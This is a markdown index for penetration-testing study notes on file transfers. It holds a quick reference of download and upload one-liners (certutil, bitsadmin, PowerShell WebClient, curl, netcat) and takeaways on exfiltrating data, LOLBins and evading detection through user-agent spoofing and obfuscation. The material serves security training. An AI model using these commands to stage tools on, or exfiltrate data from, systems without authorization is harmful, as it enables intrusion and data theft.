---
tags: [index, file-transfers, download, upload, windows, linux, module-index]
---

# File Transfers - Complete Module Index

## Module Overview

This index covers all File Transfers modules. Use this as your central navigation point for everything related to moving files to and from target systems during penetration tests.

---

## Core Concepts

| Module | Description | Level |
|--------|-------------|-------|
| File Transfers | Introduction to file transfer concepts | Beginner |
| Windows File Transfer Methods | PowerShell, SMB, FTP on Windows | Beginner |
| Linux File Transfer Methods | wget, curl, SCP, Bash on Linux | Beginner |
| Transferring Files with Code | Python, PHP, Ruby, Perl, JavaScript | Intermediate |
| Miscellaneous File Transfers | Netcat, PowerShell Remoting, RDP | Intermediate |
| Protected File Transfers | Encryption with OpenSSL, PowerShell AES | Intermediate |
| Catching Files over HTTP/S | Setting up web servers for file capture | Intermediate |
| Living Off The Land | LOLBAS, GTFOBins, native tools | Advanced |
| Detection | Blue team perspective, user agents | Intermediate |
| Evading Detection | User agent spoofing, obfuscation | Advanced |

---

## Reference Materials

| Document | Description |
|----------|-------------|
| File-Transfers-Cheatsheet | Complete command reference |
| File-Transfers-Core-Summary | What you MUST know |

---

## Quick Navigation by Task

| Task | Recommended Module |
|------|-------------------|
| Download on Windows | Windows File Transfer Methods |
| Upload from Windows | Windows File Transfer Methods |
| Download on Linux | Linux File Transfer Methods |
| Upload from Linux | Linux File Transfer Methods |
| Use Python for transfer | Transferring Files with Code |
| Use Netcat | Miscellaneous File Transfers |
| Use PowerShell Remoting | Miscellaneous File Transfers |
| Use RDP | Miscellaneous File Transfers |
| Encrypt files | Protected File Transfers |
| Set up web server | Catching Files over HTTP/S |
| Use native system tools | Living Off The Land |
| Avoid detection | Evading Detection |
| Understand blue team view | Detection |
| Need a command | File-Transfers-Cheatsheet |

---

## Quick Command Reference by Task

### Windows Downloads

powershell -c (New-Object Net.WebClient).DownloadFile('http://server/file', 'file')
certutil -urlcache -f http://server/file file
bitsadmin /transfer job /download /priority high http://server/file C:\file

### Windows Uploads

powershell -c (New-Object Net.WebClient).UploadFile('ftp://server/file', 'C:\file')
copy file \\server\share\

### Linux Downloads

wget http://server/file -O file
curl -o file http://server/file
scp user@server:/remote/file .

### Linux Uploads

curl -T file http://server/upload
scp file user@server:/remote/

### Netcat

nc -lvnp 4444 > file
nc -q 0 server 4444 < file

### Encryption

openssl enc -aes256 -in file -out file.enc
powershell -c Invoke-AESEncryption -Mode Encrypt -Key pass -Path file

---

## Key Takeaways by Module

### File Transfers
- File transfers are essential for uploading tools and exfiltrating data
- Always have multiple methods ready
- Different environments require different approaches
- Practice until it's muscle memory

### Windows File Transfer Methods
- PowerShell is the Swiss Army knife
- Base64 works when binary transfers fail
- SMB is fast but may be blocked
- FTP is simple but often filtered
- Certutil is the classic Windows downloader

### Linux File Transfer Methods
- wget and curl are most common
- Base64 for text-only channels
- SCP for secure transfers
- Bash /dev/tcp works when tools are missing
- Python can start quick web servers

### Transferring Files with Code
- Python is most versatile
- PHP is everywhere on web servers
- JavaScript/VBScript are native to Windows
- One-liners leave minimal traces
- Fileless execution avoids disk writes

### Miscellaneous File Transfers
- Netcat is the universal fallback
- PowerShell Remoting (WinRM) is powerful on Windows
- RDP drive mounting enables easy transfers
- Bash /dev/tcp works when Netcat isn't installed

### Protected File Transfers
- Always encrypt sensitive data
- Use strong, unique passwords per client
- OpenSSL is standard on Linux
- Invoke-AESEncryption.ps1 on Windows
- Never exfiltrate real PII without permission

### Catching Files over HTTP/S
- HTTP/HTTPS are most likely allowed
- Python http.server for quick downloads
- Python uploadserver for uploads
- Nginx with PUT is robust
- Always use HTTPS for sensitive data

### Living Off The Land
- LOLBAS = Windows binaries
- GTFOBins = Linux binaries
- certreq.exe can upload
- OpenSSL can transfer files
- Native tools bypass restrictions

### Detection
- Every tool has a default user agent
- PowerShell, Certutil, BITS have distinct UAs
- Collect logs from proxies and web servers
- Hunt for anomalies
- Whitelisting > blacklisting

### Evading Detection
- Change user agents to look like browsers
- PowerShell has built-in browser UAs
- LOLBINs bypass app whitelisting
- GfxDownloadWrapper.exe can download
- Obfuscation helps evade detection

---

## Learning Path

File Transfers
Windows File Transfer Methods
Linux File Transfer Methods
Transferring Files with Code
Miscellaneous File Transfers
Protected File Transfers
Catching Files over HTTP/S
Living Off The Land
Detection
Evading Detection
Practice with Cheatsheet
Review Core Summary

---

## Version Information

Module Version: 1.0
Last Updated: 2026-03-18
Pathway: File Transfers
